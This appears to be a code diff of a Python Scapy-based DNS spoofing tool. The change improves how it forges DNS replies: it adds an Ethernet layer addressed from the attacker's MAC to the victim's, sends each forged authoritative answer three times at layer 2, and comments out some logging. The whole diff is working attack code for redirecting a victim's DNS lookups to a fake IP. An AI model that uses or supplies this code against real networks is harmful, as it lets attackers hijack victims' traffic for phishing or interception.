@@ -32,9 +32,17 @@ class DNSSpoofer:
         return pkt[DNSQR].qname.decode()
     
     @staticmethod
-    def craft_spoofed_DNS_response(pkt, fake_ip: str, query_domain: str):
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+    def craft_spoofed_DNS_response(pkt, fake_ip: str, query_domain: str, interface: str):
+        # [fix 1] Ether layer!
+        # dst: Victim's mac address (pkt[Ether].src)
+        # src: attacker MAC address (get_if_hwaddr(interface))
+        
+        if not pkt.haslayer(Ether):
+            return None
+
+        spoofed_pkt = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(interface)) / \
+                      IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                       DNS(id=pkt[DNS].id,
                           qd=pkt[DNS].qd,
                           aa=1,
@@ -51,13 +59,13 @@ class DNSSpoofer:
             logging.info("Domain in DNS query is '{}'".format(query_domain))
             
             if self.target_domain in query_domain:
-                logging.info("'{}' in DNS query is target domain '{}'".format(query_domain, self.target_domain))
+                # logging.info("'{}' in DNS query is target domain '{}'".format(query_domain, self.target_domain))
                 
-                spoofed_response = self.craft_spoofed_DNS_response(pkt, self.fake_ip, query_domain)
-                logging.info("Spoofed DNS response crafted")
+                spoofed_response = self.craft_spoofed_DNS_response(pkt, self.fake_ip, query_domain, self.interface)
+                # logging.info("Spoofed DNS response crafted")
                 
-                logging.info("Spoofed DNS response sending via interface '{}'".format(self.interface))
-                send(spoofed_response, iface=self.interface, verbose=0)
+                # logging.info("Spoofed DNS response sending via interface '{}'".format(self.interface))
+                sendp(spoofed_response, iface=self.interface, verbose=0, count=3)
                 logging.info("Spoofed DNS response sent via interface '{}'".format(self.interface))
             else:
                 logging.info("'{}' in DNS query is NOT target domain '{}'".format(query_domain, self.target_domain))
